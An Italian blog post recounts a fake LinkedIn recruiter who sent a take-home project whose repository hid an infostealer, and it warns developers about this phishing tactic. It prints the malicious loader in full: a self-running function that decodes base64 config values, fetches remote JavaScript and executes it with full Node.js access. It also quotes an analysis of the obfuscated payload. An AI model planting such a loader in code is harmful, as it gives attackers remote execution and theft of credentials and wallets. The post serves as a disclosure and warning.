---
title: "Quando il recruiter è un malware"
date: 2026-03-31
draft: false
---

Oggi mi è successa una cosa un po' strana. Vengo contattato da un recruiter su LinkedIn per una posizione US Full Stack Dev. Non ho niente da perdere, quindi accetto e dò un'occhiata all'azienda: non mi entusiasma molto, ma ho in mente di cercare un altro lavoro nel 2026, quindi penso "usiamolo come palestra di allenamento".

Arriva il solito link calendly, e mi arriva subito dopo un'email con un piccolo progetto da valutare e discutere insieme nella prima interview.

⚠️ **Disclaimer: nello screenshot è visibile il link al repository. Non apritelo e non eseguite il codice in nessun caso. Contiene malware. Non mi assumo alcuna responsabilità per eventuali danni.**

![L'email del finto recruiter](/images/blog/2026-03-31-phishing-recruiter/email.png)

A prima vista mi sembra strano, di solito la prima interview è conoscitiva, ma penso che magari sono un team piccolo e vogliono andare veloci, quindi non mi faccio domande e mi riprometto di guardarlo prima del meeting.

Oggi apro il repo, e si tratta di una classica applicazione frontend e backend con un piccolo smart contract collegato. Tutto molto standard.

Comincio a guardare la struttura frontend per capire: basi di dati, endpoint etc e vedo una cosa strana.

![config.env committato nel repo](/images/blog/2026-03-31-phishing-recruiter/config-env.png)

Hanno committato `config.env`. Strano. Si saranno dimenticati.
Lo controllo e vedo delle stringhe. Ma sono strane, ad occhio sono encodate in  base64.
Vado a controllare dove vengono caricate le configurazioni, ma non trovo niente. Nessun file `config.ts`, o `loadEnv`.
Eppure dev'essere caricato da qualche parte. Allora cerco `process.env` e **fermi tutti**, non mi piace per niente quello che vedo.

```ts
// ================= GET COOKIE =================
export const getCookie = (async () => {
  try {
    const s = Buffer.from(process.env.DEV_API_KEY as string, "base64").toString();
    const k = Buffer.from(process.env.DEV_SECRET_KEY as string, "base64").toString();
    const v = Buffer.from(process.env.DEV_SECRET_VALUE as string, "base64").toString();

    const r = (
      await axios.get(s, {
        headers: { [k]: v },
      })
    ).data.cookie;

    const handler = new Function("require", r);
    handler(require);

  } catch (error: any) {}
})();
```

Cancello subito tutto (non è necessario, lo so, ma sono paranoico). Lancio Claude (web) sul repo remoto per un analisi, per capire.

> Le variabili in `.config.env` (commitatte nel repo, non per errore) decodificate da base64 rivelano:
>
> - `DEV_API_KEY` → `https://jsonkeeper.com/b/xxxx` (URL del payload)
> - `DEV_SECRET_KEY` → `x-secret-key` (header HTTP)
> - `DEV_SECRET_VALUE` → `_` (valore dell'header)
>
> La funzione `getCookie` è una IIFE (si esegue da sola al momento dell'import), fa una GET a quell'URL, prende il campo `.cookie` dalla risposta e lo passa a `new Function("require", r)` — essenzialmente un `eval()` con accesso completo a `require`, quindi a tutto Node.js: filesystem, processi, rete.
>
> Il payload scaricato è un blob di ~140KB di JavaScript pesantemente offuscato: cifratura RC4 sulle stringhe, control flow flattening con switch-case a stati, e proxy objects su ogni chiamata di funzione. Nonostante l'offuscamento, si riconoscono chiaramente:
>
> - Uso di `child_process` (spawn/exec) per eseguire comandi di sistema
> - Costruzione di indirizzi IP da variabili separate (esfiltrazione dati)
> - `process.on("uncaughtException")` e `"unhandledRejection"` agganciati per impedire crash visibili
> - Enumerazione di percorsi file e informazioni di sistema
> - Il `catch` vuoto nel wrapper per silenziare qualsiasi errore
>
> In sostanza: un **infostealer** che al primo `npm run dev` avrebbe avuto accesso completo alla macchina — cookie del browser, wallet crypto, chiavi SSH, credenziali cloud, qualsiasi cosa.

La call è stasera alle 17, non mi presenterò, ovviamente. Ma aspetto per vedere se mi contattano o se (come penso) annulleranno poco prima.
Ho già pronte le segnalazioni per LinkedIn e GitHub per chiudere gli account.

Però questa volta ci sono andato vicino. Di solito lancio `npm run dev` per vedere subito l'app frontend — se l'avessi fatto, avrei ben altri problemi adesso.

Mi sento un pelo orgoglioso per non esserci cascato, ma so che è stata solo fortuna. Spesso noi che lavoriamo con la tecnologia ci sentiamo immuni al phishing. Questo per me è stato un bel bagno di umiltà.
